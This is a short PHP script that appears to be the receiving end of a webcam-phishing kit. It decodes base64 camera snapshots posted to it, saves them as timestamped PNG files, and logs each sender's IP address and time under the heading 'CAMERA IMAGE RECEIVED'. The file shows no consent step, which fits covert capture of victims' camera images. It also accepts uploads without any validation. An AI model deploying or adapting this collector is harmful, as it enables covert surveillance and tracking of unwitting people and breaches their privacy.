<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

file_put_contents("log.txt", "CAMERA IMAGE RECEIVED\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n" . date('Y-m-d H:i:s') . "\n\n", FILE_APPEND);
}

exit(); 